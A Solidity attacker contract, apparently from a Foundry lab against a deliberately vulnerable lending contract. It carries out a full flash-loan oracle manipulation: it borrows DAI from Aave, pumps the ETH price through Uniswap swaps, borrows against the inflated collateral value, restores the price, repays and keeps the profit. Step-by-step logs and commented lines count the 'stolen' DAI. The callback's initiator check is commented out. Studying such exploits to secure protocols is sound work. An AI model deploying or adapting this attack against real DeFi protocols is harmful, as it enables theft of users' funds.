// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/console.sol";
import "./VulnerableLending.sol";
import "../interfaces/IUniswapV2Router02.sol";
import "../interfaces/ILendingPool.sol";
import "../interfaces/IERC20.sol";

contract OracleAttacker {
    VulnerableLending public lending;
    IUniswapV2Router02 public uniswapRouter;
    ILendingPool public aavePool;

    address public immutable WETH;
    address public immutable DAI;
    address public owner;

    constructor(
        address payable _lending,
        address _uniswapRouter,
        address _aavePool,
        address _weth,
        address _dai
    ) {
        lending = VulnerableLending(_lending);
        uniswapRouter = IUniswapV2Router02(_uniswapRouter);
        aavePool = ILendingPool(_aavePool);
        WETH = _weth;
        DAI = _dai;
        owner = msg.sender;
    }

    /**
     * @dev Flash loan callback - called by Aave during flash loan
     *
     * Attack flow:
     * 1. Receive flash loan of DAI
     * 2. Swap DAI → WETH (pushes ETH price UP)
     * 3. Deposit ETH collateral (worth MORE now)
     * 4. Borrow maximum DAI based on inflated price
     * 5. Swap WETH → DAI to restore price
     * 6. Repay flash loan
     * 7. Keep excess DAI as profit
     */

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    )
        external
        returns (bool)
    {
        console.log("\n=== FLASH LOAN CALLBACK (executeOperation) ===");
        console.log("Flash loan received:", amounts[0] / 1e18, assets[0] == DAI ? "DAI" : "WETH");
        console.log("Premium to pay:", premiums[0] / 1e18, assets[0] == DAI ? "DAI" : "WETH");

        // Security checks
        require(msg.sender == address(aavePool), "Caller must be Aave");
        // require(initiator == address(this), "Initiator must be this contract");

        // Decode parameters
        uint256 collateralToDeposit = abi.decode(params, (uint256));

        // Record initial state
        uint256 priceInitial = lending.getETHPrice();
        console.log("\nInitial ETH price:", priceInitial / 1e18, "DAI per ETH");

        // ----- STEP 1: Manipulate price UP by swapping DAI -> WETH -----
        console.log("\n[STEP 1] Swapping DAI -> WETH to push ETH price UP...");
        uint256 daiToSwap = (amounts[0] * 80) / 100; // Use 80% of flash loan
        console.log("  Swapping:", daiToSwap / 1e18, "DAI -> WETH");
        IERC20(DAI).approve(address(uniswapRouter), daiToSwap);

        address[] memory pathDAItoWETH = new address[](2);
        pathDAItoWETH[0] = DAI;
        pathDAItoWETH[1] = WETH;

        uint256[] memory amountsOut = uniswapRouter.swapExactTokensForTokens(
            daiToSwap,
            0, // Accept any amount
            pathDAItoWETH,
            address(this),
            block.timestamp
        );

        uint256 wethReceived = amountsOut[1];
        console.log("  Received:", wethReceived / 1e18, "WETH");
        uint256 priceManipulated = lending.getETHPrice();
        console.log("  New ETH price:", priceManipulated / 1e18, "DAI per ETH");
        console.log(
            "  Price increased by:", (priceManipulated - priceInitial) * 100 / priceInitial, "%"
        );

        // ----- STEP 2: Deposit collateral at inflated price -----
        console.log("\n[STEP 2] Depositing ETH collateral at inflated price...");
        console.log("  Depositing:", collateralToDeposit / 1e18, "ETH");

        lending.depositCollateral{ value: collateralToDeposit }();

        // Calculate how much we can borrow
        uint256 collateralValue = (collateralToDeposit * priceManipulated) / 1e18;
        uint256 maxBorrow = (collateralValue * 100) / 150; // 150% collateral ratio

        console.log("  Collateral value at inflated price:", collateralValue / 1e18, "DAI");
        console.log("  Can borrow up to:", maxBorrow / 1e18, "DAI");

        // ----- STEP 3: Borrow maximum DAI -----
        console.log("\n[STEP 3] Borrowing DAI at inflated price...");

        // Borrow as much as possible (but leave some buffer for safety)
        uint256 amountToBorrow = (maxBorrow * 95) / 100; // Borrow 95% of max
        console.log("  Borrowing:", amountToBorrow / 1e18, "DAI");
        lending.borrow(amountToBorrow);

        // ----- STEP 4: Restore price by swapping WETH -> DAI -----
        console.log("\n[STEP 4] Swapping WETH -> DAI to restore price...");

        uint256 wethBalance = IERC20(WETH).balanceOf(address(this));
        console.log("  Current WETH balance:", wethBalance / 1e18, "WETH");
        console.log("  Swapping back to restore price...");
        IERC20(WETH).approve(address(uniswapRouter), wethBalance);

        address[] memory pathWETHtoDAI = new address[](2);
        pathWETHtoDAI[0] = WETH;
        pathWETHtoDAI[1] = DAI;

        uniswapRouter.swapExactTokensForTokens(
            wethBalance, 0, pathWETHtoDAI, address(this), block.timestamp
        );

        uint256 priceFinal = lending.getETHPrice();
        console.log("  Price after restoration:", priceFinal / 1e18, "DAI per ETH");

        // ----- STEP 5: Repay flash loan -----
        console.log("\n[STEP 5] Repaying flash loan...");

        uint256 amountOwing = amounts[0] + premiums[0];
        uint256 currentDAI = IERC20(DAI).balanceOf(address(this));

        console.log("  Amount owed:", amountOwing / 1e18, "DAI");
        console.log("  Current DAI balance:", currentDAI / 1e18, "DAI");

        require(currentDAI >= amountOwing, "Not enough DAI to repay flash loan");

        // Approve Aave to take the loan + premium
        IERC20(DAI).approve(address(aavePool), amountOwing);

        uint256 profit = currentDAI - amountOwing;
        console.log("  Repaying flash loan: ", amountOwing / 1e18, "DAI");
        console.log("  Profit remaining:", profit / 1e18, "DAI");

        //console.log("\n=== ATTACK COMPLETE ===");
        //console.log("Total DAI stolen:", stolenDAI / 1e18, "DAI");
        //console.log("Net profit after flash loan:", profit / 1e18, "DAI");

        return true;
    }
}
